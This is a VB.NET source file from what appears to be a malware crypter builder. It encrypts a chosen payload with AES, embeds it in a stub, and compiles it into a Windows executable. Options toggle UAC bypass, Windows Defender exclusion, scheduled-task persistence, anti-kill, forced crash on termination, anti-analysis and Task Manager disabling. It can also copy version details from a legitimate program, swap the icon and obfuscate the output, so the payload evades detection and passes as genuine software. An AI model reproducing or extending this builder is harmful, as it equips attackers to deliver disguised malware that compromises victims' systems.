Imports System.CodeDom.Compiler
Imports System.IO
Imports System.IO.Compression
Imports System.Security.Cryptography

Public Class Codedom
    Public Shared Sub Compiler(ByVal Path As String, ByVal Res As String, ByVal MTX As String)

        Try
            Dim providerOptions = New Collections.Generic.Dictionary(Of String, String)
            providerOptions.Add("CompilerVersion", Form1.Guna2ComboBox1.Text)
            Dim CodeProvider As New Microsoft.VisualBasic.VBCodeProvider(providerOptions)
            Dim Parameters As New CompilerParameters
            Dim OP As String = " /target:winexe /platform:" + Form1.Guna2ComboBox2.Text + " /nowarn"


            With Parameters
                .GenerateExecutable = True
                .OutputAssembly = Path
                .CompilerOptions = OP
                .IncludeDebugInformation = False
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
                .ReferencedAssemblies.Add("system.dll")
                .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
                .ReferencedAssemblies.Add("System.Xml.dll")
                .ReferencedAssemblies.Add("System.Data.dll")
                .ReferencedAssemblies.Add("System.Management.dll")

                Dim Source As String = My.Resources.Stub

                Source = Replace(Source, "%Sleep%", Form1.Guna2NumericUpDown1.Value)

                If Form1.Guna2ToggleSwitch5.Checked Then
                    Source = Replace(Source, "#Const UAC = False", "#Const UAC = True")
                End If

                If Form1.Guna2ToggleSwitch13.Checked Then
                    Source = Replace(Source, "#Const WDEX = False", "#Const WDEX = True")
                End If

                If Form1.Guna2ToggleSwitch1.Checked Then
                    Source = Replace(Source, "#Const Schtasks = False", "#Const Schtasks = True")
                End If

                If Form1.Guna2ToggleSwitch3.Checked Then
                    Source = Replace(Source, "#Const AntiKillP = False", "#Const AntiKillP = True")
                End If

                If Form1.Guna2ToggleSwitch7.Checked Then
                    Source = Replace(Source, "#Const BDOS = False", "#Const BDOS = True")
                End If

                If Form1.Guna2ToggleSwitch4.Checked Then
                    Source = Replace(Source, "#Const Analysis = False", "#Const Analysis = True")
                End If

                If Form1.Guna2ToggleSwitch6.Checked Then
                    Source = Replace(Source, "#Const TaskMgr = False", "#Const TaskMgr = True")
                End If
                If Form1.Guna2TextBox1.Text = "" Then
                Else
                    Source = Replace(Source, "#Const Method1 = False", "#Const Method1 = True")
                End If
                Source = Replace(Source, "%Mutex%", MTX)

                Source = Source.Replace("#ParentRes", Res)

                If Form1.Guna2CheckBox1.CheckedState Then
                    Dim info As FileVersionInfo = FileVersionInfo.GetVersionInfo(Form1.assmb)


                    Source = Replace(Source, "%Title%", info.FileDescription)
                    Source = Replace(Source, "%Des%", info.Comments)
                    Source = Replace(Source, "%Company%", info.CompanyName)
                    Source = Replace(Source, "%Product%", info.ProductName)
                    Source = Replace(Source, "%Copyright%", info.LegalCopyright)
                    Source = Replace(Source, "%Trademark%", info.LegalTrademarks)
                    Source = Replace(Source, "%Guid%", Guid.NewGuid.ToString)


                    Source = Source.Replace("%v1%", info.FileMajorPart.ToString())
                    Source = Source.Replace("%v2%", info.FileMinorPart.ToString())
                    Source = Source.Replace("%v3%", info.FileBuildPart.ToString())
                    Source = Source.Replace("%v4%", info.FilePrivatePart.ToString())

                Else

                    Source = Replace(Source, "%Title%", Nothing)
                    Source = Replace(Source, "%Des%", Nothing)
                    Source = Replace(Source, "%Company%", Nothing)
                    Source = Replace(Source, "%Product%", Nothing)
                    Source = Replace(Source, "%Copyright%", Nothing)
                    Source = Replace(Source, "%Trademark%", Nothing)
                    Source = Replace(Source, "%Guid%", Guid.NewGuid.ToString)


                    Source = Source.Replace("%v1%", 1)
                    Source = Source.Replace("%v2%", 0)
                    Source = Source.Replace("%v3%", 0)
                    Source = Source.Replace("%v4%", 0)
                End If


                Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
                    R.AddResource(IO.Path.GetFileNameWithoutExtension(Form1.Guna2TextBox1.Text).ToLower, AES_Encryptor(IO.File.ReadAllBytes(Form1.Guna2TextBox1.Text), MTX))
                    R.Generate()
                    Source = Source.Replace("%Filename%", IO.Path.GetFileNameWithoutExtension(Form1.Guna2TextBox1.Text).ToLower)
                End Using

                .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + Res + ".Resources")


                Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Source)
                If Results.Errors.Count > 0 Then
                    For Each E In Results.Errors
                        MessageBox.Show(String.Format("{0}" & vbLf & "Line: {1}" & vbLf & "File: {2}", E.ErrorText, E.Line, E.FileName), "Compiler Error", MessageBoxButtons.OK, MessageBoxIcon.[Error])
                    Next
                End If
            End With


            Try
                Dim ResFile As String = IO.Path.GetTempPath & "\" + Res + ".Resources"
                If IO.File.Exists(ResFile) Then
                    IO.File.Delete(ResFile)
                End If
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try

            If Form1.Guna2CheckBox2.CheckedState Then
                SetIcon.InjectIcon(Path, Form1.Iconpath)
            End If

            If Form1.Guna2ToggleSwitch2.Checked Then
                Debug.WriteLine(ObfuscationStub.Obfuscator.Save(IO.File.ReadAllBytes(Path), Path))
            End If

            Form1.Guna2Button2.Text = "Build"
            Form1.Guna2Button2.Enabled = True

            GC.Collect()

            Dim myFile As New FileInfo(Path)
            Form1.Guna2MessageDialog1.Show(Path, "Builded!" & " : " & Methods.BytesToString(myFile.Length))

        Catch ex As Exception
            Form1.Guna2Button2.Text = "Build"
            Form1.Guna2Button2.Enabled = True
            MessageBox.Show(ex.Message)
        End Try
    End Sub
    Public Shared Function AES_Encryptor(ByVal input As Byte(), ByVal Pass As String) As Byte()
        Dim AES As New RijndaelManaged
        Dim Hash As New MD5CryptoServiceProvider
        Dim ciphertext As String = ""
        Try
            AES.Key = Hash.ComputeHash(System.Text.Encoding.Default.GetBytes(Pass))
            AES.Mode = CipherMode.ECB
            Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = input
            Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Function
End Class
